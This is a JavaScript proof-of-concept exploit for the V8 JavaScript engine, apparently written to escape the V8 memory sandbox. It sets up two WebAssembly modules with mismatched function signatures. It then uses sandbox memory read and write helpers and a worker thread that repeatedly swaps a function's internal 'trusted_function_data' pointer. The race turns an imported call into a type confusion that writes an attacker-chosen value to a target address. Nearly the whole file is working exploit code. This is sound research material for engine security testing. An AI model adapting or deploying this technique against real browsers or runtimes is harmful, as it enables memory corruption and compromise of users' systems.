

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");



// param ordering: untagged -> tagged

// module 0: exporter
let builder = new WasmModuleBuilder();
let $struct_0 = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls_0 = builder.addType(makeSig([kWasmI64, wasmRefType($struct_0)], []));
let $sig_v_ll_0 = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $writer = builder.addFunction("writer", $sig_v_ls_0)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct_0, 0,
  ]);
let $dummy = builder.addFunction("dummy", $sig_v_ll_0).exportFunc().addBody([]);
let instance0 = builder.instantiate();
let { writer, dummy } = instance0.exports;

// module 1: importer
builder = new WasmModuleBuilder();
let $struct_1 = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls_1 = builder.addType(makeSig([kWasmI64, wasmRefType($struct_1)], []));
let $sig_v_ll_1 = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $importWriter = builder.addImport('import', 'writer', $sig_v_ll_1);
let $boom = builder.addFunction("boom", $sig_v_ll_1)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprCallFunction, $importWriter,
  ]);

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmGlobalObjectTypeOffset = 28;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let writer_sfi = getField(getPtr(writer), 0x10);
let writer_tfd = getField(writer_sfi, 0x4);
console.log('writer_tfd:', writer_tfd.toString(16)); // trusted_function_data
let dummy_sfi = getField(getPtr(dummy), 0x10);
let dummy_tfd = getField(dummy_sfi, 0x4);
console.log('dummy_tfd:', dummy_tfd.toString(16));

// set writer->shared()->trusted_function_data = dummy->shared()->trusted_function_data
//setField(writer_sfi, 4, dummy_tfd);

let workerScript = `
  // Prepare corruption utilities.
  const kHeapObjectTag = 1;
  const kWasmGlobalObjectTypeOffset = 28;
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  function getPtr(obj) {
    return Sandbox.getAddressOf(obj) + kHeapObjectTag;
  }
  function getField(obj, offset) {
    return memory.getUint32(obj + offset - kHeapObjectTag, true);
  }
  function setField(obj, offset, value) {
    memory.setUint32(obj + offset - kHeapObjectTag, value, true);
  }
  let writer_sfi = ${writer_sfi};
  let writer_tfd = ${writer_tfd};
  let dummy_tfd = ${dummy_tfd};
  while (true) {
    setField(writer_sfi, 4, dummy_tfd);
    setField(writer_sfi, 4, writer_tfd);
  }
`;
// in worker is completely new script 
let worker = new Worker(workerScript, {type: 'string'});

console.log('running...');

while (true) {
  try {
    let instance1 = builder.instantiate({'import': {'writer': writer}});
    let { boom } = instance1.exports;
    boom(BigInt(Sandbox.targetPage) - 0x7n, 0xdeadbeefcafebaben);
  } catch (e) {
    // console.log(e);
  }
}